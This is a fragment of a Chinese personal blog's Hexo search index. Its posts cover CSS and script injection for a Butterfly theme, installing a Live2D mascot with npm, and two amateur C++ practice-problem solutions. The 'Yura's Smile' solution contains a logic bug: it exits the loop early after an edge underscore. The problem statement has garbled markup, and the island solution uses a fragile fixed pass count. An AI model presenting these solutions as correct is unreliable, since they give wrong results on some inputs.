class="attr">inject:</span> </span><br><span class="line">  <span class="attr">bottom:</span> </span><br><span class="line">     <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">async</span> <span class="string">src=&quot;/js/title.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="hexo三连查看效果"><a href="#hexo三连查看效果" class="headerlink" title="hexo三连查看效果"></a>hexo三连查看效果</h2>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人卡片实现渐变色</title>
      <link href="/post/25226bb5.html"/>
      <url>/post/25226bb5.html</url>
      
        <content type="html"><![CDATA[<h2 id="添加代码"><a href="#添加代码" class="headerlink" title="添加代码"></a>添加代码</h2><p>打开Blog根目录/source/css/custom.css，路径中的css文件夹或custom.css文件没有的话就新建，写入如下代码：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 侧边栏个人信息卡片动态渐变色 */</span></span><br><span class="line"><span class="selector-id">#aside-content</span> &gt; <span class="selector-class">.card-widget</span><span class="selector-class">.card-info</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(</span><br><span class="line">    -<span class="number">45deg</span>,</span><br><span class="line">    <span class="number">#e8d8b9</span>,</span><br><span class="line">    <span class="number">#eccec5</span>,</span><br><span class="line">    <span class="number">#a3e9eb</span>,</span><br><span class="line">    <span class="number">#bdbdf0</span>,</span><br><span class="line">    <span class="number">#eec1ea</span></span><br><span class="line">  );</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgb</span>(<span class="number">66</span>, <span class="number">68</span>, <span class="number">68</span>);</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">400%</span> <span class="number">400%</span>;</span><br><span class="line">  -webkit-<span class="attribute">animation</span>: Gradient <span class="number">10s</span> ease infinite;</span><br><span class="line">  -moz-<span class="attribute">animation</span>: Gradient <span class="number">10s</span> ease infinite;</span><br><span class="line">  <span class="attribute">animation</span>: Gradient <span class="number">10s</span> ease infinite <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-webkit-keyframes</span> Gradient &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-moz-keyframes</span> Gradient &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> Gradient &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 黑夜模式适配 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#aside-content</span> &gt; <span class="selector-class">.card-widget</span><span class="selector-class">.card-info</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#191919ee</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 个人信息Follow me按钮 */</span></span><br><span class="line"><span class="selector-id">#aside-content</span> &gt; <span class="selector-class">.card-widget</span><span class="selector-class">.card-info</span> &gt; <span class="selector-id">#card-info-btn</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#3eb8be</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="引入代码"><a href="#引入代码" class="headerlink" title="引入代码"></a>引入代码</h2><p>打开主题配置文件_config.butterfly.yml，搜索inject并按下列格式补充完整即可</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="hexo三连查看效果"><a href="#hexo三连查看效果" class="headerlink" title="hexo三连查看效果"></a>hexo三连查看效果</h2>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加看板娘</title>
      <link href="/post/2fd28ec8.html"/>
      <url>/post/2fd28ec8.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我安装的是博客自带的看板娘，比较推荐这个，消耗资源比较少，虽然不会说话也不能换装，但是会乖乖地盯着你的鼠标~</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>打开Blog根目录cmd并输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>打开Blog根目录下的站点配置文件<code>_config.yml</code>搜索<code>live2d</code>，没有的话就将下列内容复制到最底部</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Live2D</span></span><br><span class="line"><span class="comment">## https://github.com/EYHN/hexo-helper-live2d</span></span><br><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#开关插件版看板娘</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span> <span class="comment"># 默认</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span> <span class="comment"># 插件在站点上的根目录(相对路径)</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span> <span class="comment"># 脚本文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span> <span class="comment"># 模型文件相对与插件根目录路径</span></span><br><span class="line">  <span class="comment"># scriptFrom: jsdelivr # jsdelivr CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: unpkg # unpkg CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: https://npm.elemecdn.com/live2d-widget@3.x/lib/L2Dwidget.min.js # 你的自定义 url</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span> <span class="comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">false</span> <span class="comment"># 调试, 是否在控制台输出日志</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-wanko</span> <span class="comment"># npm-module package name</span></span><br><span class="line">    <span class="comment"># use: wanko # 博客根目录/live2d_models/ 下的目录名</span></span><br><span class="line">    <span class="comment"># use: ./wives/wanko # 相对于博客根目录的路径</span></span><br><span class="line">    <span class="comment"># use: https://npm.elemecdn.com/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # 你的自定义 url</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span> <span class="comment">#控制看板娘位置</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">150</span> <span class="comment">#控制看板娘大小</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">300</span> <span class="comment">#控制看板娘大小</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span> <span class="comment"># 手机中是否展示</span></span><br></pre></td></tr></table></figure><h2 id="更换形象"><a href="#更换形象" class="headerlink" title="更换形象"></a>更换形象</h2><p>预览并挑选一个喜欢的看板娘形象，我选择的是一个白帽子小孩：<code>live2d-widget-model-koharu</code></p><p>看板娘模型预览：<a href="https://blog.csdn.net/wang_123_zy/article/details/87181892">(4条消息) Hexo添加Live2D看板娘+模型预览</a></p><h4 id="打开Blog根目录cmd，复制你选择的看板娘编码并执行命令，注意替换编码"><a href="#打开Blog根目录cmd，复制你选择的看板娘编码并执行命令，注意替换编码" class="headerlink" title="打开Blog根目录cmd，复制你选择的看板娘编码并执行命令，注意替换编码"></a>打开Blog根目录cmd，复制你选择的看板娘编码并执行命令，注意替换编码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save live2d-widget-model-koharu</span><br></pre></td></tr></table></figure><p>打开Blog根目录下的站点配置文件<code>_config.yml</code>搜索<code>model</code>，将其修改为你的看板娘编码</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">model:</span></span><br><span class="line">  <span class="attr">use:</span> <span class="string">live2d-widget-model-koharu</span></span><br><span class="line">  <span class="comment"># 默认为live2d-widget-model-wanko</span></span><br></pre></td></tr></table></figure><p>hexo三连即可在本地预览效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><h2 id="卸载看板娘"><a href="#卸载看板娘" class="headerlink" title="卸载看板娘"></a>卸载看板娘</h2><p>打开Blog根目录cmd并输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-helper-live2d <span class="comment">#卸载看板娘插件</span></span><br><span class="line">npm uninstall live2d-widget-model-modelname <span class="comment">#卸载看板娘模型。记得替换modelname为看板娘名称</span></span><br></pre></td></tr></table></figure><p>打开Blog根目录下的站点配置文件<code>_config.yml</code>搜索<code>live2d</code>，将该配置项注释掉即可</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 插件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小岛面积</title>
      <link href="/post/1ee68337.html"/>
      <url>/post/1ee68337.html</url>
      
        <content type="html"><![CDATA[<h4 id="题目：用一个二维方阵（最小为3X3，最大为9X9）表示一片海域。方阵中的元素只由0和1组成。1表示海岸线。计算由海岸线围起来的小岛面积（即：由1围起来的区域中0的个数）"><a href="#题目：用一个二维方阵（最小为3X3，最大为9X9）表示一片海域。方阵中的元素只由0和1组成。1表示海岸线。计算由海岸线围起来的小岛面积（即：由1围起来的区域中0的个数）" class="headerlink" title="题目：用一个二维方阵（最小为3X3，最大为9X9）表示一片海域。方阵中的元素只由0和1组成。1表示海岸线。计算由海岸线围起来的小岛面积（即：由1围起来的区域中0的个数）"></a>题目：用一个二维方阵（最小为3X3，最大为9X9）表示一片海域。方阵中的元素只由0和1组成。1表示海岸线。计算由海岸线围起来的小岛面积（即：由1围起来的区域中0的个数）</h4><p> <strong>**上述方阵表示的海域满足下面两个要求：</strong><br> <strong>1、小岛只有一个</strong><br> 2、用1表示的海岸线肯定可以封闭成一个小岛，但有可能是凸的，也有可能是凹的，所以在判断时：对于方阵中的任意一个元素0，如果其位于同一行上的两个1之间，并且位于同一列上的两个1之间，则该元素肯定在1围起来的区域中。不符合该规定的其它情况不考虑。**<br> 样例：<br> 输入：<br> 6<br> 0 0 0 1 0 0<br> 0 0 1 0 1 0<br> 0 1 0 0 0 1<br> 1 0 0 0 1 0<br> 1 0 1 0 1 0<br> 1 1 0 1 1 1<br> 输出：<br> 9</p><p> <strong>思路：边界上的0一定不被1包围，将其值改为2，与2有接触的0被感染成2，不断感染，最后幸存的0是被1包围的</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> sea[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; sea[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">5</span>; k++)     <span class="comment">// 矩阵最大为9x9, 最多的情况是中间的0不被包含，则需要侵蚀5次</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (sea[i][j] == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i == <span class="number">0</span> || i == n - <span class="number">1</span> || j == <span class="number">0</span> || j == n - <span class="number">1</span>)</span><br><span class="line">                        sea[i][j] = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (sea[i][j - <span class="number">1</span>] == <span class="number">2</span> || sea[i - <span class="number">1</span>][j] == <span class="number">2</span> || sea[i][j + <span class="number">1</span>] == <span class="number">2</span> || sea[i + <span class="number">1</span>][j] == <span class="number">2</span>)</span><br><span class="line">                        sea[i][j] = <span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!sea[i][j])</span><br><span class="line">                sum++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="如果有更好的写法欢迎在评论区给出噢"><a href="#如果有更好的写法欢迎在评论区给出噢" class="headerlink" title="如果有更好的写法欢迎在评论区给出噢^_^"></a>如果有更好的写法欢迎在评论区给出噢^_^</h3>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yura&#39;s Smile</title>
      <link href="/post/c020e7d8.html"/>
      <url>/post/c020e7d8.html</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>After holding one team contest, boy Yura got very tired and wanted to change his life and move to Japan. In honor of such a change, Yura changed his name to something nice.</p><p>Fascinated by this idea he already thought up a name s consisting only of characters “<em>“ and “^”. But there’s a problem — Yura likes smiley faces “^</em>^” and “^^”. Therefore any character of the name must be a part of at least one such smiley. Note that only the <strong>consecutive</strong> characters of the name can be a smiley face.</p><p>More formally, consider all occurrences of the strings “^<em>^” and “^^” in the string s. Then all such occurrences must cover the whole string s, possibly with intersections. For example, in the string “^^__^</em>^^__^” the characters at positions 3,4,9,10 and 11 are not contained inside any smileys, and the other characters at positions 1,2,5,6,7 and 8 are contained inside smileys.</p><p>In one operation Jura can insert one of the characters “_” and “^” into his name s (you can insert it at any position in the string). He asks you to tell him the minimum number of operations you need to do to make the name fit Yura’s criteria.</p><h3 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h3><p>Each test consists of multiple test cases. The first line contains a single integer t(1≤t≤100) —the number of test cases. The description of test cases follows.</p><p>The first and only line of each test case contains a single string s (1≤|s|≤100), consisting of characters “_” and “^”,  — the name to change.</p><h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><p>For each test case, output a single integer — the minimum number of characters you need to add to the name to make it fit for Yura. If you don’t need to change anything in the name, print 0.</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p><img src="https://s1.ax1x.com/2023/04/29/p91g10I.png" alt=""></p><p>第一次做英文编程题，看得有点懵，大概是在说，输入多行字符串，每个字符串由^或下划线组成，要求每个字符串的每个字符都能和相邻的字符组成^^或^_^，问需要添加的 ^ 和下划线的最小数目是多少</p><p>我的思路是，遍历字符串，搜索下划线，找到就观察其相邻两边是否有 ^ ，两边都有就直接删除掉这个下划线；只有一个就计数加一，并删除这个下划线；一个都没有就计数加二，删除该下划线并在该位置插入一个 ^；只有一个字符的字符串单独处理</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string str;</span><br><span class="line"><span class="type">int</span> n, pos, res[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="built_in">getline</span>(cin, str);<span class="comment">// 把前面cin遗留的结束符处理掉</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">getline</span>(cin, str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (str == <span class="string">&quot;^&quot;</span>)</span><br><span class="line">res[i]++;</span><br><span class="line"><span class="keyword">while</span> ((pos = str.<span class="built_in">find</span>(<span class="string">&#x27;_&#x27;</span>)) != string::npos)<span class="comment">// 字符串中没有&#x27;_&#x27;时停止</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == pos)<span class="comment">// &#x27;_&#x27;在第一个位置</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;^&#x27;</span> == str[pos + <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line">res[i]++;</span><br><span class="line">str.<span class="built_in">erase</span>(pos, <span class="number">1</span>);<span class="comment">// 删除&#x27;_&#x27;</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">str.<span class="built_in">erase</span>(pos, <span class="number">1</span>);<span class="comment">// 删除&#x27;_&#x27;</span></span><br><span class="line">str.<span class="built_in">insert</span>(pos, <span class="number">1</span>, <span class="string">&#x27;^&#x27;</span>);</span><br><span class="line">res[i] += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (str.<span class="built_in">size</span>() - <span class="number">1</span> == pos)<span class="comment">// &#x27;_&#x27;在最后一个位置</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;^&#x27;</span> == str[pos - <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line">res[i]++;</span><br><span class="line">str.<span class="built_in">erase</span>(pos, <span class="number">1</span>);<span class="comment">// 删除&#x27;_&#x27;</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">str.<span class="built_in">erase</span>(pos, <span class="number">1</span>);<span class="comment">// 删除&#x27;_&#x27;</span></span><br><span class="line">str.<span class="built_in">insert</span>(pos, <span class="number">1</span>, <span class="string">&#x27;^&#x27;</span>);</span><br><span class="line">res[i] += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">// &#x27;_&#x27;在中间</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;^&#x27;</span> == str[pos - <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;^&#x27;</span> == str[pos + <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line">str.<span class="built_in">erase</span>(pos, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">res[i]++;</span><br><span class="line">str.<span class="built_in">erase</span>(pos, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&#x27;^&#x27;</span> != str[pos - <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;^&#x27;</span> == str[pos + <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line">str.<span class="built_in">erase</span>(pos, <span class="number">1</span>);</span><br><span class="line">res[i]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">res[i] += <span class="number">2</span>;</span><br><span class="line">str.<span class="built_in">erase</span>(pos, <span class="number">1</span>);</span><br><span class="line">str.<span class="built_in">insert</span>(pos, <span class="number">1</span>, <span class="string">&#x27;^&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">cout &lt;&lt; res[i] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="如果有更好的写法欢迎在评论区给出噢"><a href="#如果有更好的写法欢迎在评论区给出噢" class="headerlink" title="如果有更好的写法欢迎在评论区给出噢^_^"></a>如果有更好的写法欢迎在评论区给出噢^_^</h3>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Twikoo评论通用配置</title>
